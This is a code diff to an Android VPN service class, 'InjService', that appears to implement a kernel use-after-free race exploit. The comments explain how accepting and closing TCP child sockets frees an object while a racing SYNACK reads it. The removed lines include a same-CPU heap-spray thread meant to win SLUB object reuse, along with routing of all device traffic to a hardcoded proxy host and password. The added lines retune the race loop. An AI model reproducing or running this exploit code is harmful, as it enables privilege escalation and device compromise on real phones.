@@ -204,15 +204,6 @@ public class InjService extends VpnService {
             builder.setSession("inj");
             builder.addAddress(TUN_ADDRESS, TUN_PREFIX);
             builder.setMtu(TUN_MTU);
-            // Carry the device's real traffic as well as the injected packets.
-            // The app excludes itself, otherwise its own forwarding sockets
-            // would be routed back into the tunnel.
-            builder.addRoute("0.0.0.0", 0);
-            builder.addDnsServer(SS_DNS);
-            try {
-                builder.addDisallowedApplication(getPackageName());
-            } catch (Exception ignored) {
-            }
             if (Build.VERSION.SDK_INT >= 29) {
                 builder.setBlocking(true);
             }
@@ -223,10 +214,6 @@ public class InjService extends VpnService {
                 return;
             }
             Log.i(TAG, "tun up, fd=" + tun.getFd() + ", address " + TUN_ADDRESS + "/" + TUN_PREFIX);
-            forwarder = new TunForwarder(null,
-                    new FileOutputStream(tun.getFileDescriptor()),
-                    SS_HOST, SS_PORT, SS_PASSWORD, SS_DNS);
-            Log.i(TAG, "forwarding real traffic to " + SS_HOST + ":" + SS_PORT);
 
             listener = new ServerSocket();
             listener.setReuseAddress(true);
@@ -643,18 +630,6 @@ int[] fds = snapshotChildFds();
         }
         long accepted = 0;
 
-        // The spray thread must live on the same cpu as this loop: SLUB hands
-        // a just-freed object to the next same-cpu allocation, and the racing
-        // SYNACK needs that reuse to happen inside its few-microsecond build
-        // window. CPU 0 is where the accept/close/free runs.
-        Thread sprayer = new Thread(() -> {
-            while (running.get() && attackFd == fd) {
-                Native.spraySameCpu(0, 50);
-            }
-        }, "tun-spray");
-        sprayer.setDaemon(true);
-        sprayer.start();
-
         // Accept and close with nothing in between.
         //
         // Closing the child is what runs inet_sock_destruct() and frees the
@@ -663,8 +638,8 @@ int[] fds = snapshotChildFds();
         // and microseconds is all the kernel's window is worth - the two reads
         // of opt->optlen sit about two hundred nanoseconds apart.
         while (running.get() && attackFd == fd) {
-            long n = Native.rstSpin(fd, 50);
-            if (n <= 0) {
+            long n = Native.recycleSpin(fd, 7, 50);
+            if (n < 0) {
                 break;
             }
             accepted += n;
